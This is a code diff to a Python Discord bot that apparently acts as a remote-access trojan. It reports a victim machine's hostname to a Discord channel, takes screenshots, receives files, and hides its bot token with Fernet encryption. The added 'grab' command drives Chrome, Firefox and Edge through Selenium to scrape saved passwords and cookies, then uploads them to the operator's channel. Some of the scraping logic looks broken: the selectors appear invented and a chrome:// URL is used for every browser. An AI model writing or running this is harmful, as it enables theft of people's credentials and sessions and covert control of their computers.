@@ -6,17 +6,15 @@ from PIL import ImageGrab
 import io
 import platform
 from cryptography.fernet import Fernet
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+import time
 
 # Decrypting the token
-
-# Replace with the encryption key you generated (it must be a bytes object)
 key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
 cipher_suite = Fernet(key)
-
-# Replace with the encrypted token you generated
 encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token
-
-# Decrypt the token
 TOKEN = cipher_suite.decrypt(encrypted_token).decode()
 
 # Set up the bot
@@ -48,7 +46,7 @@ async def send(ctx):
     if len(ctx.message.attachments) > 0:
         attachment = ctx.message.attachments[0]
         file_path = os.path.join(DOWNLOAD_DIR, attachment.filename)
-        
+
         # Download the file
         await attachment.save(file_path)
 
@@ -75,6 +73,58 @@ async def screenshot(ctx):
     byte_io.seek(0)
     await ctx.send("Here is the screenshot:", file=discord.File(byte_io, 'screenshot.png'))
 
+# Command to grab auto-fill passwords and cookies
+@bot.command()
+async def grab(ctx):
+    # List of browsers to check
+    browsers = ["chrome", "firefox", "edge"]
+
+    for browser in browsers:
+        if browser == "chrome":
+            driver_path = "path/to/chromedriver"  # Replace with the actual path to chromedriver
+            driver = webdriver.Chrome(executable_path=driver_path)
+        elif browser == "firefox":
+            driver_path = "path/to/geckodriver"  # Replace with the actual path to geckodriver
+            driver = webdriver.Firefox(executable_path=driver_path)
+        elif browser == "edge":
+            driver_path = "path/to/msedgedriver"  # Replace with the actual path to msedgedriver
+            driver = webdriver.Edge(executable_path=driver_path)
+
+        driver.get("chrome://settings/passwords")  # For Chrome; adjust for other browsers
+        time.sleep(2)  # Wait for the page to load
+
+        # Extract passwords and cookies
+        passwords = []
+        cookies = []
+
+        # Example for Chrome; adjust for other browsers
+        password_elements = driver.find_elements(By.CSS_SELECTOR, "div.password-item")
+        for element in password_elements:
+            site = element.find_element(By.CSS_SELECTOR, "div.site").text
+            username = element.find_element(By.CSS_SELECTOR, "div.username").text
+            password = element.find_element(By.CSS_SELECTOR, "div.password").text
+            passwords.append(f"Site: {site}\nUsername: {username}\nPassword: {password}\n")
+
+        cookie_elements = driver.find_elements(By.CSS_SELECTOR, "div.cookie-item")
+        for element in cookie_elements:
+            site = element.find_element(By.CSS_SELECTOR, "div.site").text
+            name = element.find_element(By.CSS_SELECTOR, "div.name").text
+            value = element.find_element(By.CSS_SELECTOR, "div.value").text
+            cookies.append(f"Site: {site}\nName: {name}\nValue: {value}\n")
+
+        driver.quit()
+
+        # Save passwords and cookies to text files
+        with open(os.path.join(DOWNLOAD_DIR, f"{browser}_passwords.txt"), "w") as f:
+            f.write("\n".join(passwords))
+
+        with open(os.path.join(DOWNLOAD_DIR, f"{browser}_cookies.txt"), "w") as f:
+            f.write("\n".join(cookies))
+
+        # Upload the files to the channel
+        await ctx.send(file=discord.File(os.path.join(DOWNLOAD_DIR, f"{browser}_passwords.txt")))
+        await ctx.send(file=discord.File(os.path.join(DOWNLOAD_DIR, f"{browser}_cookies.txt")))
+
 # On bot startup: Check and create the channel, ping @everyone in the corresponding channel
 @bot.event
 async def on_ready():
@@ -83,18 +133,18 @@ async def on_ready():
     # Get the desktop name or username to create the channel
     desktop_name = platform.node()  # This is the name of the PC
     channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found
-    
+
     # Fetch the guild (server) by ID and the channel
     guild = bot.get_guild(GUILD_ID)  # Get the specific guild by ID
     if not guild:
         print(f"Guild with ID {GUILD_ID} not found!")
         return
-    
+
     channel = await get_or_create_channel(guild, channel_name)
 
     # Send a "ping" message to indicate the bot is online
     await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")
-    
+
     print(f"Bot is online. Pinged channel: {channel.name}")
 
 # Run the bot
